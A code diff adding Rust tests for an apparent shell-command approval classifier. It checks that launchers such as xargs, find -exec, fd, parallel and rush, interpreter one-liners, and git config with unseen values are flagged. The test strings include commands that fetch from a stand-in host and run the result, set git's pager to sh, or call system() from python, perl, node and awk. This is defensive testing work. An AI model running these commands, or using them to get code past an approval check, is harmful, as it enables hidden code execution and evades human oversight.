@@ -9568,3 +9568,169 @@ fn issue_1449_runner_checks_are_linear() {
         });
     }
 }
+
+/// #1276 items 1 and 5: input a launcher puts into the line it runs may be
+/// the program itself, an interpreter's code or awk's program, or, with no
+/// command given, whole command lines. Each asks as code the classifier
+/// cannot see, whatever feeds the launcher. All of these were quiet on main.
+#[test]
+fn issue_1276_launcher_input_as_program_or_code_asks() {
+    for command in [
+        // Item 1: the launched program is the input.
+        "printf git | xargs -I % % config core.pager sh",
+        "printf curl | xargs -I{} {} x",
+        "curl -s https://x.example | xargs -I% % config",
+        "xargs -I{} {} x < f",
+        "xargs -I{} {}",
+        "xargs -0 -I% % < f",
+        "xargs -n1 -I% % < f",
+        "xargs -i {} < f",
+        "xargs --replace=R R < f",
+        "xargs --repl {} < f",
+        "xargs -J % % < f",
+        "xargs -I{} ./{}",
+        "xargs -I{} /usr/bin/{} config",
+        "xargs -I{} env {} config",
+        "xargs -I{} nice {} config",
+        r"find . -exec {} \;",
+        r"find . -exec {} config core.pager sh \;",
+        r"find . -exec ./{} \;",
+        r"find . -execdir {} \;",
+        r"find . -ok {} \;",
+        r"bfs -exec {} \;",
+        "fd -x {} config",
+        "fd -X {}",
+        "fd --exec {}",
+        "fd --exec={}",
+        "rush '{}' < f",
+        "rush {} < f",
+        // ...in a shell's script the launcher puts it into.
+        "xargs -I% sh -c '% config core.pager sh' < f",
+        "xargs -I% sh -c 'true; % x' < f",
+        "xargs -I% sh -c 'sh -c \"% x\"' < f",
+        // Whole command lines.
+        "parallel < cmds",
+        "parallel -a cmds",
+        "parallel :::: cmds",
+        "parallel ::: \"$(cat f)\"",
+        "xjobs < cmds",
+        "xjobs -j 4 < cmds",
+        "xjobs -s cmds",
+        // Item 5: an interpreter's inline code, or awk's program.
+        "printf 'core.pager sh' | xargs -I% python3 -c 'import os; os.system(\"git config %\")'",
+        "xargs -I% perl -e 'system(\"git config %\")' < f",
+        "xargs -I% ruby -e 'system(\"git config %\")' < f",
+        "xargs -I% node -e 'require(\"child_process\").execSync(\"git config %\")' < f",
+        "xargs -I% php -r 'system(\"git config %\");' < f",
+        "xargs -I% python3 -c 'print(%)' < f",
+        "xargs -I% awk 'BEGIN{system(\"git config %\")}' < f",
+        "xargs -I% awk -v x=1 'BEGIN{system(\"%\")}' < f",
+        "xargs -I% gawk -e 'BEGIN{system(\"%\")}' < f",
+        "xargs -I% gawk --source='BEGIN{system(\"%\")}' < f",
+        "xargs -I% sh -c 'python3 -c \"print(%)\"' < f",
+        r#"find . -exec python3 -c 'print("{}")' \;"#,
+        "fd -x perl -e 'print \"{}\"'",
+        "parallel \"python3 -c 'print({})'\" ::: a",
+        // An option the reading does not know may take the next word.
+        "xargs -I% --frobnicate x % < f",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::UnseenCode),
+            "{command}"
+        );
+    }
+    // Asked on main too; kept as regressions.
+    for command in [
+        "parallel {} config core.pager sh ::: git",
+        "env_parallel {} ::: git",
+        "cat f | parallel",
+        "cat f | xargs -I% python3 -c 'print(%)'",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::UnseenCode),
+            "{command}"
+        );
+    }
+    // Input as data stays quiet: arguments, files, awk variables, script
+    // files on disk, and the launcher's own literal `:::` lines.
+    for command in [
+        "xargs -I{} sh -c 'echo {}' < f",
+        "xargs -I{} mv {} {}.bak < f",
+        r"find . -name '*.py' -exec python3 {} \;",
+        r"find . -exec awk '{print $1}' {} \;",
+        "xargs -I% awk -v x=% '{print x}' file < f",
+        "xargs -I% awk '{print}' % < f",
+        "xargs -I% perl -ne 'print' % < f",
+        "xargs -I{} python3 -c 'import sys; print(sys.argv[1])' {} < f",
+        "parallel gzip ::: a b",
+        "parallel -j4 'gzip {}' ::: a b",
+        "parallel ::: 'echo a' 'echo b'",
+        "parallel echo < f",
+        "parallel 'awk \"{print}\"' ::: f",
+        "fd -e rs -x wc -l",
+        "find . -name x -exec rm {} +",
+        "xargs rm < f",
+        "xargs -0 rm -f < f",
+        "xargs -n 2 echo < f",
+        "xjobs gzip < f",
+        "rush 'gzip {}' < f",
+        "rush < f",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1276: reading launchers stays linear, and a line with more launchers
+/// than are read asks.
+#[test]
+fn issue_1276_launcher_input_checks_are_linear() {
+    for (label, unit) in [
+        ("finders", "find . -name x "),
+        ("exec options", "-exec echo {} ; "),
+        ("xargs", "xargs -I% -n1 "),
+        ("parallel", "parallel -j4 --unknown x "),
+        ("scripts", "sh -c 'echo %'; "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let line = format!("xargs -I% {}", unit.repeat(200 * scale));
+            let _ = script(&line);
+        });
+    }
+    let line = format!("echo {}", "fd ".repeat(17));
+    assert_eq!(script(&line), Some(ProtectedActionKind::UnseenCode));
+    let line = format!("echo {}", "fd ".repeat(16));
+    assert_eq!(script(&line), None);
+}
+
+/// #1276 item 3: a `git config` word holding a value the classifier cannot
+/// see outside double quotes may be several words, as `"$@"` may: it asks
+/// as a write unless the visible words make it a read. So does such a
+/// value as the first word, which may be an option (`-e`).
+#[test]
+fn issue_1276_git_config_unseen_words_ask() {
+    for command in [
+        "x=$(cat f); git config $x",
+        "git config $X",
+        "git config \"$k\"",
+        "git config user.name $NAME",
+        "k=$(curl -s https://x.example); git config $k",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::Persistence),
+            "{command}"
+        );
+    }
+    for command in [
+        "git config --get \"$k\"",
+        "git config --get $k",
+        "git config user.name \"$NAME\"",
+        "git config --get-regexp \"$pat\"",
+        "git config user.email \"$(git log -1 --format=%ae)\"",
+        "for k in a b; do git config --get \"$k\"; done",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
